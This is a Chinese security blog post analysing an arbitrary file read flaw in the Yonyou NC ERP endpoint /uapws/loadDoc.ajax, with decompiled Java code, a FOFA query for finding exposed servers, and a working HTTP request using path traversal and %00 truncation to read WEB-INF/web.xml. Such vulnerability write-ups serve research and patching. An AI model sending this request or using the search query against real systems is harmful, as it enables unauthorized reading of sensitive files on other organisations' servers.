---
title: "用友NC loadDoc.ajax 文件读取漏洞"
source: https://mrxn.net/jswz/yonyou-nc-uapws-loadDoc-fileread.html
asset_dir: assets/用友nc-loaddoc.ajax-文件读取漏洞
---

# 用友NC loadDoc.ajax 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/6 08:27
- 1205浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

企业资源规划

SQL

部署

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC loadDoc 接口处 ws 参数存在[文件读取](https://mrxn.net/tag/文件读取)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取设备上任意文件内容，造成敏感信息泄露。

漏洞扫描服务

# 影响版本

# fofa语法

> `icon_hash="1085941792" || app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `LoadDocAction.java` 里有关 `LoadDocAction` 的实现逻辑

```
package nc.uap.ws.console.action;

import java.io.IOException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.uap.ws.console.action.IAction;
import nc.uap.ws.console.config.Config;
import nc.uap.ws.console.fault.Fault;
import nc.uap.ws.console.fault.Faults;
import nc.uap.ws.console.helper.DocHelper;

public class LoadDocAction
implements IAction {
    @Override
    public Faults execuse(HttpServletRequest req, HttpServletResponse resp) {
        Faults faults = new Faults();
        String ws = req.getParameter("ws");
        if (ws == null || ws.equals("")) {
            faults.add(new Fault(0, "ws param need to be setted"));
            return faults;
        }
        DocHelper manager = new DocHelper(Config.docDir);
        try {
            String doc = manager.loadDoc(ws);
            resp.setStatus(200);
            resp.getWriter().write(doc);
        }
        catch (IOException e) {
            faults.add(new Fault(80, e.getMessage()));
            return faults;
        }
        return faults;
    }
}
```

可以看到 获取 `ws` 参数，直接带入 `loadDoc` 方法，跟进看其实现

企业资源规划

```
package nc.uap.ws.console.helper;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

public class DocHelper {
    private String DocDir;

    public DocHelper(String DocDir) {
        this.DocDir = DocDir;
    }

    public String loadDoc(String ws) throws IOException {
        StringBuilder builder = new StringBuilder();
        BufferedReader br = null;
        try {
            String line;
            File file = new File(new File(this.DocDir), ws + ".txt");
            if (!file.exists()) {
                file.createNewFile();
            }
            FileReader fr = new FileReader(file);
            br = new BufferedReader(fr);
            while ((line = br.readLine()) != null) {
                builder.append(line);
            }
        }
        catch (IOException e) {
            throw e;
        }
        finally {
            if (br != null) {
                br.close();
                br = null;
            }
        }
        return builder.toString();
    }
```

用户可控的 `ws` 参数直接拼接文件路径，未对输入进行合法性校验，如果后端java版本低于7，就通过%00截断绕过 txt 后缀限制，从而达到任意文件读取的目的。

软件

关于 Java 中 %00 (NULL byte) 截断漏洞的版本信息如下:

受影响的 Java 版本范围:

- Java 7 以下所有版本(Java SE 7 之前)
- Java 6 所有版本(包括 Java SE 6 所有更新版本)
- Java 5 所有版本
- Java 1.4 及更早版本

不受影响的 Java 版本:

- Java 7 及以上版本(Java SE 7+)已修复了这个问题

其实这个漏洞和之前已经披露的 `saveDoc` 任意文件上传漏洞都在同一个文件里，只不过最近才披露这个 `loadDoc` 任意[文件读取漏洞](https://mrxn.net/tag/文件读取)罢了。

[![用友NC loadDoc.ajax 文件读取漏洞](images/img-001-3155e5b0e695.webp)](https://image.mrxn.net/8fa47036b88f452797b044cc88743631.webp)

# 漏洞复现

```
POST /uapws/loadDoc.ajax HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

ws=../../WEB-INF/web.xml%00
```

成功读取到 `web.xml` 文件

[![用友NC loadDoc.ajax 文件读取漏洞](images/img-002-e268bc5ebc06.webp)](https://image.mrxn.net/7196f91cb57646d2be678799ad780cb7.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
